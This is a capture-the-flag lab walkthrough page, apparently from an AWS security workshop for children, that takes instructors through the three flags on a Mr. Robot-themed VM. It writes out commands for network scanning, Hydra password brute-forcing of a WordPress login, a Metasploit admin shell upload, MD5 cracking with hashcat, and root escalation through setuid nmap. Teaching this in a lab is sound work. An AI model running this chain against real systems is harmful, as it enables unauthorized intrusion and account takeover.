



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="This workshop is for kids ages 8 - 18 to become more familiar with cloud security concepts.">
      
      
        <link rel="canonical" href="https://r00tz-ctf.awssecworkshops.com/walkthrough/">
      
      
        <meta name="author" content="aws-security-workshops@amazon.com">
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../assets/images/aws-favicon.ico">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.0.2">
    
    
      
        <title>Instructor Walkthrough - r00tz CTF on AWS</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/application.982221ab.css">
      
      
    
    
      <script src="../assets/javascripts/modernizr.1f0bcf2b.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../stylesheets/custom.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
    viewBox="0 0 416 448" id="__github">
  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
        99.5z" />
</svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#instructor-mr-robot-walkthrough" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <!--
  Copyright (c) 2016-2018 Martin Donath <martin.donath@squidfunk.com>
  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to
  deal in the Software without restriction, including without limitation the
  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
  sell copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:
  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.
  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
  FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
  IN THE SOFTWARE.
-->

<!-- Application header -->
<header class="md-header" data-md-component="header">

    <!-- Top-level navigation -->
    <nav class="md-header-nav md-grid">
      <div class="md-flex">
  
        <!-- Link to home -->
        <div class="md-flex__cell md-flex__cell--shrink">
          <a href="https://aws.amazon.com/"
              title="Amazon Web Services"
              class="md-header-nav__button md-logo">
            
              <img src="../assets/images/aws_smile_logo.png" width="40" height="24" />
            
          </a>
        </div>
  
        <!-- Button to toggle drawer -->
        <div class="md-flex__cell md-flex__cell--shrink">
          <label class="md-icon md-icon--menu md-header-nav__button"
              for="__drawer"></label>
        </div>
  
        <!-- Header title -->
        <div class="md-flex__cell md-flex__cell--stretch">
          <div class="md-flex__ellipsis md-header-nav__title"
              data-md-component="title">
            
              
                <span class="md-header-nav__topic">
                  r00tz CTF on AWS
                </span>
                <span class="md-header-nav__topic">
                  Instructor Walkthrough
                </span>
              
            
          </div>
        </div>
        
        
        <!-- Button to open search dialogue -->
        <!--
        <div class="md-flex__cell md-flex__cell--shrink">
          
            
              <label class="md-icon md-icon--search md-header-nav__button"
                  for="__search"></label>
  
              
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
            
          
        </div>

         -->
         
         <div class="md-flex__cell md-flex__cell--shrink">
            <div class="md-flex__ellipsis md-header-nav__lang">
                <div>
                    <button onclick="window.location.href = 'https://awssecworkshops.com/';" class="md-lang-dropbtn fa fa-home"></button>
                </div>
            </div>
        </div>
  
        <!-- Repository containing source -->
        
          <div class="md-flex__cell md-flex__cell--shrink">
            <div class="md-header-nav__source">
              


  

<a href="https://github.com/aws-samples/r00tz-ctf-on-aws/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    aws-samples/r00tz-ctf-on-aws
  </div>
</a>
            </div>
          </div>
        
      </div>
    </nav>
  </header>
    
    <div class="md-container">
      
        
      
      
        

<nav class="md-tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  <li class="md-tabs__item">
    
      <a href=".." title="Security Capture the Flag (CTF)" class="md-tabs__link md-tabs__link--active">
        Security Capture the Flag (CTF)
      </a>
    
  </li>

      
        
      
        
      
        
      
        
      
    </ul>
  </div>
</nav>
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <!--
  Copyright (c) 2016-2019 Martin Donath <martin.donath@squidfunk.com>
  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to
  deal in the Software without restriction, including without limitation the
  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
  sell copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:
  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.
  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
  FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
  IN THE SOFTWARE.
-->

<!-- Main navigation -->
<nav class="md-nav md-nav--primary" data-md-level="0">

  <!-- Site title -->
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="https://r00tz-ctf.awssecworkshops.com/"
        title="r00tz CTF on AWS" class="md-nav__button md-logo">
      
        <img src="../assets/images/aws_smile_logo.png" width="48" height="48" />
      
    </a>
    r00tz CTF on AWS
  </label>

  <!-- Repository containing source -->
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/aws-samples/r00tz-ctf-on-aws/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    aws-samples/r00tz-ctf-on-aws
  </div>
</a>
    </div>
  

  <!-- Render item list -->
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href=".." title="Security Capture the Flag (CTF)" class="md-nav__link">
      Security Capture the Flag (CTF)
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../environment-setup/" title="Environment Setup" class="md-nav__link">
      Environment Setup
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Instructor Walkthrough
      </label>
    
    <a href="./" title="Instructor Walkthrough" class="md-nav__link md-nav__link--active">
      Instructor Walkthrough
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#first-flag" title="First Flag" class="md-nav__link">
    First Flag
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#second-flag" title="Second Flag" class="md-nav__link">
    Second Flag
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#third-flag" title="Third Flag" class="md-nav__link">
    Third Flag
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../contribute/" title="Contributing" class="md-nav__link">
      Contributing
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../license/" title="License" class="md-nav__link">
      License
    </a>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#first-flag" title="First Flag" class="md-nav__link">
    First Flag
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#second-flag" title="Second Flag" class="md-nav__link">
    Second Flag
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#third-flag" title="Third Flag" class="md-nav__link">
    Third Flag
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/aws-samples/r00tz-ctf-on-aws/edit/master/docs/walkthrough.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <h1 id="instructor-mr-robot-walkthrough">Instructor <small>Mr. Robot Walkthrough</small></h1>
<p>General guidance:</p>
<ol>
<li>Pay attention to the IP address- the VM may have a different IP address- if the kids copy &amp; insert their material</li>
<li>Many command flags are case sensitive.  Pay attention to the case of command flags</li>
<li>Be sure to ask the kids if they want to take a break after finding a flag.  Going through all 3 may be too advanced for many of the kids.</li>
</ol>
<h2 id="first-flag">First Flag</h2>
<p>Students should first use <em>ip</em> to see their network details, then they should use <em>nmap</em> to find what hosts sit on the network. They should see one of the hosts has ports 80 and 443 open, indicating it’s probably hosting a web application. They should navigate to this ip address in a browser. They should execute:</p>
<p><strong>Go to a Kali terminal</strong></p>
<div class="codehilite"><pre><span></span>ip addr show eth0
</pre></div>


<div class="codehilite"><pre><span></span>nmap -n 10.13.13.0/24
</pre></div>


<p><img alt="Image" src="../images/instructor-flag1.png" title="Image" /></p>
<p>The first flag can be found by navigating to the robots.txt for the site in the browser. From there, students should see there is a file called key-1-of-3.txt they can navigate to. In addition, there will be an fsociety.dic file, they should download that now. The process for getting there is:</p>
<ul>
<li><strong><web app ****ip**** address>/robots.txt</strong></li>
<li><strong><web app ****ip**** address>/key-1-of-3.txt</strong></li>
</ul>
<h2 id="second-flag">Second Flag</h2>
<p>The second flag is a little trickier and will take a bit more time. First, students should try to navigate to a page that doesn’t exist. This should generate a 404 page; this will reveal that the site is powered via wordpress. One of the features of wordpress is the ability to login as either a user or an admin. This site is found on /wp-login.php. The steps are:</p>
<ul>
<li><strong>Navigate to <web app ****ip**** address>/</strong><strong>completelyfakepage</strong></li>
<li><strong>Click </strong><strong>Log in on the bottom left</strong></li>
</ul>
<p><img alt="Image" src="../images/instructor-flag2.png" title="Image" /></p>
<p>From here the student will need to do some password cracking to be able to login. First, they should try and login and see that the site will say if a username is correct or not. They should try elliot (name of the main character in the show) to see it’ll say the password is wrong. They should open developer tools and go to the network tab while trying to login from here they should look at a sample call to see what that looks like.</p>
<ul>
<li><strong>Open developer tools and go to network tab</strong></li>
<li><strong>Login with a random username/password</strong></li>
<li><strong>Try logging in with <strong><em>*elliot</em></strong>* as username</strong></li>
</ul>
<p><img alt="Image" src="../images/instructor-flag2b.png" title="Image" /></p>
<p>This is where the fsociety.dic file comes into play. However, it contains a lot of duplicates and will slow down the cracking process, so it should be deduped first. This can be done via: <em>sort -u <strong>fsocity.dic</strong> -o </em><em>uniq.dic</em></p>
<ul>
<li><strong>Go to <web app ****ip**** address>/<strong><em>*foscity.dic</em></strong>* and download the file</strong></li>
<li><strong>On the downloaded file<strong><em>* (in a terminal)</em></strong><em> run: <strong><em>* sort -u </em></strong></em>fsocity.dic<strong><em>* -o </em></strong>*uniq.dic</strong></li>
</ul>
<p>From here, the student can run THC Hydra, a password cracking tool. Based on the knowledge they gained about the login calls and their failed attempt they should have everything they need to start the cracking a sample command is: <em>hydra -<strong>l</strong> <strong>elliot</strong> -P <strong>uniq.dic</strong> <strong><SERVER IP></strong> http-post-form “<strong>/</strong>wp-login.php:log<strong>=^USER^&amp;</strong>pwd<strong>=^PASS^:</strong>F=is incorrect</em><em>”</em> which will take significantly less time. Finally, the correct login is: user: elliot, pass: ER28-0652. The process is as follows:</p>
<ul>
<li><strong>Go to a Kali</strong><strong> terminal</strong></li>
</ul>
<div class="codehilite"><pre><span></span>hydra -l elliot -P uniq.dic &lt;web app ip address&gt; http-post-form “/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=is incorrect”
</pre></div>


<p><img alt="Image" src="../images/instructor-flag2c.png" title="Image" /></p>
<p>Students are going to probably want to play around on the admin site for a while. Ultimately they’ll realize the second key isn’t on the web app. You should point out they likely need to get access onto the box to do that. Thankfully WordPress has a long history of vulnerabilities! Specifically one for performing reverse shell uploads. Metasploit is just the tool to do that for them.</p>
<p>Do make sure to talk about what Metasploit is and what makes it so useful.</p>
<p>The process is as follows:</p>
<ul>
<li><strong>Go to a Kali</strong><strong> terminal</strong></li>
<li><strong>Run <strong><em>*ms</em></strong>*f</strong><strong>console</strong></li>
<li><strong>use exploit/<strong><em>*unix</em></strong><em>/<strong><em>*webapp</em></strong></em>/</strong><strong>wp_admin_shell_upload</strong></li>
<li><strong>set USERNAME </strong><strong>elliot</strong></li>
<li><strong>set PASSWORD ER28-0652</strong></li>
<li><strong>set RHOST </strong><strong>10.13.13.102</strong></li>
<li><strong>set WPCHECK false</strong></li>
<li><strong>exploit</strong></li>
<li><strong>In <strong><em>*meterpreter</em></strong>* run shell</strong></li>
</ul>
<p><img alt="Image" src="../images/instructor-flag2d.png" title="Image" /></p>
<p><img alt="Image" src="../images/instructor-flag2e.png" title="Image" /></p>
<p><img alt="Image" src="../images/instructor-flag2f.png" title="Image" /></p>
<p>The default meterpreter shell is kind of annoying and students won’t like it. They should setup a quick python script to give them a proper shell. The steps for this is as follows:</p>
<div class="codehilite"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">asdf</span><span class="o">.</span><span class="n">py</span>
</pre></div>


<div class="codehilite"><pre><span></span>python /tmp/asdf.py
</pre></div>


<p><img alt="Image" src="../images/instructor-flag2g.png" title="Image" /></p>
<p>Students probably won’t know this but /home/ is really useful for finding info about who’s on the box. If they cd into the /home/ directory they should find there’s a user called robot. If they cd into /home/robot/ they should see two things: the second key file and an md5 hash of robot’s password. They won’t be able to access the file since they’re not robot. They should be able to see the hash in the password file though. The steps are as follows:</p>
<ul>
<li><strong>cd /home/</strong></li>
<li><strong>cd robot/</strong></li>
<li><strong>cat password.raw-md5</strong></li>
</ul>
<p><img alt="Image" src="../images/instructor-flag2h.png" title="Image" /></p>
<p>You should let the student know that md5 is considered broken and easy to break. In addition, kali comes with a hash breaker called hashcat they can use to crack the password. Kali also comes with a wordlist they can use to brute force the password. This file is called rockyou. The steps for cracking it as follows:</p>
<ul>
<li><strong>Copy </strong><strong>the hash in the password.raw-md5 file</strong></li>
<li><strong>Go to a Kali terminal</strong></li>
<li><strong>gunzip<strong><em>* /</em></strong><em>usr<strong><em>*/share/wordlists/rockyou.</em></strong></em>txt.gz</strong></li>
<li><strong>echo “<copied hash>” &gt; password.md5</strong></li>
<li><strong>hashcat<strong><em>* --force -a 0 -m 0 password.md5 /</em></strong>*usr</strong><strong>/share/wordlists/rockyou.txt -o cracked.txt</strong></li>
<li><strong>cat cracked.txt</strong></li>
</ul>
<p><img alt="Image" src="../images/instructor-flag2i.png" title="Image" /></p>
<p><img alt="Image" src="../images/instructor-flag2j.png" title="Image" /></p>
<p><img alt="Image" src="../images/instructor-flag2k.png" title="Image" /></p>
<p>Now they have the username/password for the robot user. It’s robot/abcdefghijklmnopqrstuvwxyz essentially the password is all letters of the alphabet. Back on the server shell they should run su robot to login as them. Then they can access the second key. The process is as follows:</p>
<ul>
<li><strong>su</strong><strong> robot</strong></li>
<li><strong>cat key-2-of-3.txt</strong></li>
</ul>
<p><img alt="Image" src="../images/instructor-flag2l.png" title="Image" /></p>
<h2 id="third-flag">Third Flag</h2>
<p>Finally, they’ll need to gain access to root, ideally the documentation explains what root is and why it’s so important to protect, but some reminding might be necessary. What they should also know is that some programs will actually run as a different user than the person that started the program, this means that while they ran the program, the program could be running as someone entirely different. Thus, if they can trick or get that program to open a shell, then they would be able to act as root if it’s set to run as root. This is where the setuid flag comes into play. They can find all programs with this flag set via: <em>find / -perm -4000 2&gt; /dev/null</em>. The process is as follows:</p>
<div class="codehilite"><pre><span></span>find / -perm -4000 2&gt; /dev/null
</pre></div>


<p><img alt="Image" src="../images/instructor-flag3.png" title="Image" /></p>
<p>What they should find is a few programs with it set, most of them should make sense, but nmap should be strange to them. If they just run <em>nmap</em> with no flags, they should find it’s actually a version with an interactive mode! In addition, they should run ls -l on it and see it’s owned by root. Thus <em>nmap<strong> --interactive<em> will actually grant them a root shell, from there a simple </em>!</strong>sh</em> will grant a more usable shell with which they can navigate to /root and see the final flag. The steps are as follows:</p>
<ul>
<li><strong>ls -l /<strong><em>*usr</em></strong>*/local/bin/</strong><strong>nmap</strong></li>
<li><strong>nmap</strong><strong> --interactive </strong></li>
<li><strong>!</strong><strong>sh</strong></li>
<li><strong>whoami</strong></li>
<li><strong>cd /root/</strong></li>
<li><strong>ls</strong></li>
<li><strong>cat key-3-of-3.txt</strong></li>
</ul>
<p><img alt="Image" src="../images/instructor-flag3b.png" title="Image" /></p>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../environment-setup/" title="Environment Setup" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Environment Setup
              </span>
            </div>
          </a>
        
        
          <a href="../contribute/" title="Contributing" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Contributing
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            &copy; 2019, Amazon Web Services, Inc. or its affiliates. All rights reserved.
          </div>
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
  <div class="md-footer-social">
    <link rel="stylesheet" href="../assets/fonts/font-awesome.css">
    
      <a href="https://awssecworkshops.com" class="md-footer-social__link fa fa-home"></a>
    
      <a href="https://aws.amazon.com/security/" class="md-footer-social__link fa fa-shield"></a>
    
      <a href="https://twitter.com/awssecurityinfo?lang=en" class="md-footer-social__link fa fa-twitter"></a>
    
      <a href="https://aws.amazon.com/blogs/security/" class="md-footer-social__link fa fa-rss"></a>
    
  </div>

    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/application.d9aa80ab.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
      
    
  </body>
</html>